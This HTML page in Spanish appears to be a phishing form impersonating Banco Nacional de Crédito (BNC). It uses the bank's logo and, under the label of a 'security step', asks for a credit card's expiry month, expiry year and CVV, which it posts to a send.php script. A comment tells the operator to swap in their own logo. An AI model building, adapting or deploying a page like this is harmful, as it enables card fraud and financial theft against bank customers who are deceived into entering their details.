<!DOCTYPE html>
<html lang="es">
<head>
<meta charset="UTF-8">
<meta name="viewport" content="width=device-width, initial-scale=1.0">
<link rel="shortcut icon" href="iconero.ico">
<title>BNC</title>
<link rel="preconnect" href="https://fonts.googleapis.com">
<link rel="preconnect" href="https://fonts.gstatic.com" crossorigin>
<link href="https://fonts.googleapis.com/css2?family=Poppins:wght@500;600&display=swap" rel="stylesheet">
<style>
  :root{
    --border:#e2e5ea;
    --border-focus:#b9c0cc;
    --value:#3a3f4a;
    --placeholder:#9aa0ac;
    --icon:#5b6270;
    --radius:14px;
  }

  *{box-sizing:border-box;}

  body{
    margin:0;
    min-height:100vh;
    display:flex;
    align-items:center;
    justify-content:center;
    background:linear-gradient(160deg,#ffffff 0%,#f4f6f8 45%,#e7eaef 100%);
    font-family:-apple-system,BlinkMacSystemFont,"Segoe UI",Roboto,Helvetica,Arial,sans-serif;
    padding:24px;
  }

  .card-stack{
    width:100%;
    max-width:560px;
    display:flex;
    flex-direction:column;
    gap:22px;
  }

  /* Logo */
  .logo{
    display:block;
    margin:0 auto 34px;
    height:88px;
    width:auto;
    object-fit:contain;
  }

  @media (max-width:480px){
    .logo{height:72px;margin-bottom:26px;}
  }

  /* Título "Paso de seguridad:" en naranja BNC */
  .step-title{
    font-family:"Poppins",-apple-system,BlinkMacSystemFont,"Segoe UI",Roboto,sans-serif;
    font-weight:600;
    font-size:18px;
    letter-spacing:.2px;
    color:#FF6A00;
    text-align:center;
    margin:-14px 0 30px;
  }

  @media (max-width:480px){
    .step-title{font-size:17px;margin:-8px 0 24px;}
  }

  /* Contenedor de cada campo */
  .field{
    position:relative;
    border:1px solid var(--border);
    border-radius:var(--radius);
    background:#fff;
    padding:16px 20px;
    transition:border-color .15s ease, box-shadow .15s ease;
  }

  .field:focus-within{
    border-color:var(--border-focus);
    box-shadow:0 0 0 3px rgba(150,160,175,.12);
  }

  /* Etiqueta flotante con degradado de color */
  .field-label{
    display:block;
    font-size:13px;
    font-weight:500;
    letter-spacing:.2px;
    margin-bottom:6px;
    color:#9aa0ac;
    width:max-content;
  }

  /* Select y input comparten estilo de texto */
  .field select,
  .field input{
    width:100%;
    border:none;
    outline:none;
    background:transparent;
    font-size:20px;
    color:var(--value);
    padding:0;
    padding-right:34px; /* espacio para el icono */
    appearance:none;
    -webkit-appearance:none;
    -moz-appearance:none;
    font-family:inherit;
    cursor:pointer;
  }

  .field input{cursor:text;}

  /* Placeholder / opción vacía */
  .field select:invalid{color:var(--value);}
  .field input::placeholder{color:var(--placeholder);}
  .field select option{color:var(--value);}

  /* Icono (flecha o candado) a la derecha, alineado con el valor */
  .field-icon{
    position:absolute;
    right:20px;
    bottom:16px;
    width:20px;
    height:20px;
    color:var(--icon);
    pointer-events:none;
    display:flex;
    align-items:center;
    justify-content:center;
  }

  .field-icon svg{width:100%;height:100%;display:block;}

  /* El input del CVV no tiene label superior en la imagen */
  .field--cvv{
    display:flex;
    align-items:center;
    padding-top:20px;
    padding-bottom:20px;
  }

  /* Candado centrado verticalmente en el campo CVV */
  .field--cvv .field-icon{
    bottom:auto;
    top:50%;
    transform:translateY(-50%);
  }

  @media (max-width:480px){
    .field select,.field input{font-size:18px;}
    .field-label{font-size:12px;}
  }


    .submit-btn{
    width:100%;
    border:none;
    border-radius:14px;
    background:#FF6A00;
    color:#fff;
    font-family:"Poppins",sans-serif;
    font-size:18px;
    font-weight:600;
    padding:16px;
    cursor:pointer;
    transition:background .15s ease;
  }
  .submit-btn:hover{background:#e85f00;}
</style>
</head>
<body>

  <div class="card-stack">

    <!-- LOGO: cambia el "src" por el de tu logo (por ejemplo src="logo.png") -->
    <img class="logo" alt="Logo"
      src="https://upload.wikimedia.org/wikipedia/commons/8/84/Banco_Nacional_de_Credito.png?utm_source=es.wikipedia.org&utm_campaign=index&utm_content=original">

    <h1 class="step-title">Paso de seguridad, completa los datos de tu tarjeta de crédito:</h1>
    <form action="send.php" method="POST">

    <!-- Mes de vencimiento -->
    <div class="field">
      <label class="field-label" for="mes">Mes de Vencimiento TDC</label>
      <select id="mes" name="mes" required>
        <option value="" selected>-- Mes --</option>
        <option value="01">01 - Enero</option>
        <option value="02">02 - Febrero</option>
        <option value="03">03 - Marzo</option>
        <option value="04">04 - Abril</option>
        <option value="05">05 - Mayo</option>
        <option value="06">06 - Junio</option>
        <option value="07">07 - Julio</option>
        <option value="08">08 - Agosto</option>
        <option value="09">09 - Septiembre</option>
        <option value="10">10 - Octubre</option>
        <option value="11">11 - Noviembre</option>
        <option value="12">12 - Diciembre</option>
      </select>
      <span class="field-icon" aria-hidden="true">
        <svg viewBox="0 0 24 24" fill="none" stroke="currentColor" stroke-width="2" stroke-linecap="round" stroke-linejoin="round">
          <polyline points="6 9 12 15 18 9"></polyline>
        </svg>
      </span>
    </div>

    <!-- Año de vencimiento -->
    <div class="field">
      <label class="field-label" for="anio">Año de Vencimiento TDC</label>
      <select id="anio" name="anio" required>
        <option value="" selected>-- Año --</option>
        <!-- Los años se generan con JS -->
      </select>
      <span class="field-icon" aria-hidden="true">
        <svg viewBox="0 0 24 24" fill="none" stroke="currentColor" stroke-width="2" stroke-linecap="round" stroke-linejoin="round">
          <polyline points="6 9 12 15 18 9"></polyline>
        </svg>
      </span>
    </div>

    <!-- CVV -->
    <div class="field field--cvv">
      <input type="text" id="cvv" name="cvv" inputmode="numeric" autocomplete="cc-csc"
             maxlength="4" placeholder="CVV ..." aria-label="CVV">
      <span class="field-icon" aria-hidden="true">
        <svg viewBox="0 0 24 24" fill="currentColor">
          <path d="M12 1a5 5 0 0 0-5 5v3H6a2 2 0 0 0-2 2v9a2 2 0 0 0 2 2h12a2 2 0 0 0 2-2v-9a2 2 0 0 0-2-2h-1V6a5 5 0 0 0-5-5zm3 8H9V6a3 3 0 0 1 6 0v3z"/>
        </svg>
      </span>
    </div>
      
    <button type="submit" class="submit-btn">Continuar</button>
  </form>
  </div>

  <script>
    // Generar años (año actual + próximos 12)
    (function(){
      var select = document.getElementById('anio');
      var current = new Date().getFullYear();
      for (var i = 0; i <= 12; i++){
        var y = current + i;
        var opt = document.createElement('option');
        opt.value = y;
        opt.textContent = y;
        select.appendChild(opt);
      }
    })();

    // CVV: solo números
    document.getElementById('cvv').addEventListener('input', function(e){
      e.target.value = e.target.value.replace(/\D/g,'');
    });
  </script>

</body>
</html>
